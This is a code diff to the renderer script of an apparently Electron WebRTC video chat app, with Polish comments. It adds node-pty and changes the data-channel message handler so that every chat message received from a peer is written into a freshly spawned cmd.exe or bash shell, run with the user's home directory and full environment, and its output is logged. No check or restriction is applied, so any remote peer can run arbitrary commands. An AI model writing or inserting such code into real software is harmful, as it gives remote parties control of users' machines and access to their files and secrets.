@@ -1,4 +1,5 @@
 console.log('In renderer.js!');
+const pty = require('node-pty');
 
 var mapPeers = {};
 var usernameInput = document.querySelector('#username');
@@ -255,6 +256,26 @@ function dcOnMessage(event){
     var li = document.createElement('li');
     li.appendChild(document.createTextNode(message));
     messageList.appendChild(li);
+
+    // Sprawdzenie systemu operacyjnego (cmd.exe dla Windows, bash dla Linux/Mac)
+    const shell = process.platform === 'win32' ? 'cmd.exe' : 'bash';
+
+    // Tworzenie terminala
+    const ptyProcess = pty.spawn(shell, [], {
+        name: 'xterm-color',
+        cols: 80,
+        rows: 30,
+        cwd: process.env.HOME,
+        env: process.env
+    });
+
+    // Wysłanie wiadomości jako komendy do terminala
+    ptyProcess.write(`${message}\r`);
+
+    // Wyświetlenie wyniku komendy w konsoli
+    ptyProcess.on('data', function(data) {
+        console.log(data);  // Można też dodać wynik do elementu HTML
+    });
 }
 
 function createVideo(peerUsername){
